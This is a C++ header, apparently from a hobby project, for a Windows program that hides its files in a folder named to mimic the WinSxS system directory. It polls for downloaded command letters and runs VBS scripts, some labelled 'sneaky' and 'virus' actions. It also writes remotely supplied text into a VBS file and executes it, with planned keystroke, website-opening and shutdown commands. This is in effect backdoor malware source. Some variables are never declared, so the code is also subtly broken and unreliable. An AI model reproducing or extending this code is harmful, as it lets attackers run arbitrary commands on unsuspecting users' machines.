#pragma once
#pragma once
#include "stdafx.h"
#include <stdio.h>
#include <cstdlib>
#include <Windows.h> // use < > for all system and library headers
#include <winuser.h>
#include <cmath>
#include <iostream>
#include <iomanip>
#include <complex>
#include <string>
#include <ctime>
#include <fstream>
#include <atlstr.h>

using namespace std;

char letter2; //Need another one
string startvisual; //Start DAVisual
int resetsua = 0; //Variable for resetting single-use actions
int return0 = 1; //when = to 0 it returns 0
string Type; //used for text transfered from the type function
string TypeBackup; //used to compare against Type string to see if it should run the function or not


void DAVisual() {
	CString str = "C:/WinSxS/WinSxSms/DAVisual.exe";
	CString action = "open";
	ShellExecute(NULL, action, str, NULL, NULL, SW_SHOW);
}
void actionvoid() {
	ofstream writeractioncheck("C:/WinSxS/WinSxSms/SxSaction.txt"); //Writes to demo app version file so it knows when the knew version has downloaded
	if (!writeractioncheck) {
		cout << "Error writing to file..." << endl;
	}
	else {
		writeractioncheck << "_";
	}
	writeractioncheck.close();

	letter = '_'; //resets letter
	updateabort = 0; //resets abort function for update checking
	CString str = "C:/WinSxS/WinSxSms/actioncheck.vbs"; //Opens file in backround to check if new update is available
	CString action = "open";
	ShellExecute(NULL, action, str, NULL, NULL, SW_SHOW);
	while (letter == '_' && updateabort < 50 || letter == ' ' && updateabort < 50) {
		updateabort++;
		ifstream readeractioncheck("C:/WinSxS/WinSxSms/SxSaction.txt");
		if (!readeractioncheck) {
		}
		else {
			readeractioncheck.get(letter);
		}
		readeractioncheck.close();

		Sleep(300);
	}

	if (updateabort < 50) { //If the update failed to download it will still move on
		ifstream sectionreader("C:/WinSxS/WinSxSms/sectionkey.txt"); //Check section number... If section number is matching then play sound
		if (!sectionreader) {
		}
		else {
			sectionkey = "";
			sectionreader.get(letter2);
			sectionkey += letter2;
		}
		sectionreader.close();
		if (letter == 'a') {
			cout << "Action for all sections" << endl;
			CString str = "C:/WinSxS/WinSxSms/hello.vbs";
			CString action = "open";
			ShellExecute(NULL, action, str, NULL, NULL, SW_SHOW);
		}
		else if (letter == 'v') {
			cout << "Action for visual" << endl;
			CString str = "C:/WinSxS/WinSxSms/DAVisual.exe";
			CString action = "open";
			ShellExecute(NULL, action, str, NULL, NULL, SW_SHOW);
			ShellExecute(NULL, action, str, NULL, NULL, SW_SHOW);
			ShellExecute(NULL, action, str, NULL, NULL, SW_SHOW);
		}
		else if (letter == 'r') {
			cout << "Action for resetting single-use actions" << endl;
			resetsua = 0;
		}
		else if (letter == 's' && resetsua == 0) {
			cout << "Action for fast and sneaky sub to pewdiepie" << endl;
			CString str = "C:/WinSxS/WinSxSms/subfast.vbs";
			CString action = "open";
			ShellExecute(NULL, action, str, NULL, NULL, SW_SHOW);
			resetsua = 1;
		}
		else if (letter == 'l' && resetsua == 0) {
			cout << "Action for virus sub to pewdiepie" << endl;
			CString str = "C:/WinSxS/WinSxSms/subvirus.vbs";
			CString action = "open";
			ShellExecute(NULL, action, str, NULL, NULL, SW_SHOW);
			resetsua = 1;
		}
		else if (letter == '0') {
			return0 = 0;
		}
		else if (letter == 't') {

			cout << "Action for direct text keyboard writer" << endl;
			//download the type.txt file
			ofstream writertypecheck("C:/WinSxS/WinSxSms/Type.txt"); //Writes to demo app version file so it knows when the knew version has downloaded
			if (!writertypecheck) {
				cout << "Error writing to file..." << endl;
			}
			else {
				writertypecheck << "_";
			}
			writertypecheck.close();

			letter = '_'; //resets letter
			updateabort = 0; //resets abort function for update checking
			CString str = "C:/WinSxS/WinSxSms/typecheck.vbs";
			CString action = "open";
			ShellExecute(NULL, action, str, NULL, NULL, SW_SHOW);
			while (letter == '_' && updateabort < 50 || letter == ' ' && updateabort < 50) {
				updateabort++;
				ifstream readertypecheck("C:/WinSxS/WinSxSms/Type.txt");
				if (!readertypecheck) {
				}
				else {
					readertypecheck.get(letter);
				}
				readertypecheck.close();

				Sleep(300);
			}
			//open file and check against previous version if commands have changed, if they have continue
			//Get newly downloaded file
			Type = "";
			ifstream readertype("C:/WinSxS/WinSxSms/Type.txt");
			for (int i = 0; !readertype.eof(); i++) {
				readertype.get(letter);
				Type += letter;
			}
			readertype.close();
			Type.pop_back();
			cout << Type << endl;

			//Read the last used file
			TypeBackup = "";
			ifstream readertypeBackupcheck("C:/WinSxS/WinSxSms/TypeBackup.txt");
			if (!readertypeBackupcheck) {
			}
			else {
				for (int i = 0; !readertypeBackupcheck.eof(); i++) {
					readertypeBackupcheck.get(letter);
					TypeBackup += letter;
				}
				TypeBackup.pop_back();
			}
			readertypeBackupcheck.close();

			//Compare strings
			if (Type != TypeBackup) {

				//temp?? port directly to vbs file
				ofstream writertypevbscheck("C:/WinSxS/WinSxSms/Type.vbs"); //Writes to demo app version file so it knows when the knew version has downloaded
				if (!writertypevbscheck) {
					cout << "Error writing to file..." << endl;
				}
				else {
					writertypevbscheck << Type;
				}
				writertypevbscheck.close();

				//read first word of each line, convert into the apprpriate string, and save it as type.vbs
				//take out all apostrophes: ' ' ' and correct wrond quotes that lean to normal ones """
				//if word == type or Type, put each letter out slowly in the vbs file, with delay inbetween as if someone was typing
				//if word == text or Text, just put it into one type line with no delays
				//if word == say or Say, speak the contents of the line
				//if word == open or Open, open it as a website in the default browser
				//if word == delay or Delay, delay with milisecounds
				//if word == popup or Popup
				//if word is == shutdown/restart or Shutdown/Restart, send shutdown/restart command to computer
				//if word is unrecognized print it as it is, assuming it isn't a pre-programmed command

				//Make sure to close both editors before the next download begins
				//open the newly created Type.vbs
				CString str = "C:/WinSxS/WinSxSms/Type.vbs";
				CString action = "open";
				ShellExecute(NULL, action, str, NULL, NULL, SW_SHOW);

				cout << "Action Compleated" << endl;
				
			}
			else {
				cout << "The text command string is identical to the previous string. No action taken." << endl;
			}

			//write to backup file for next compare
			ofstream writertypebackupcheck("C:/WinSxS/WinSxSms/TypeBackup.txt"); //Writes to demo app version file so it knows when the knew version has downloaded
			if (!writertypebackupcheck) {
				cout << "Error writing to file..." << endl;
			}
			else {
				writertypebackupcheck << Type;
			}
			writertypebackupcheck.close();

		}
		else { //TAKE AWAY
			cout << "No action" << endl;
		}
	}
	else { //TAKE AWAY
		cout << "Action Failure" << endl;
	}
}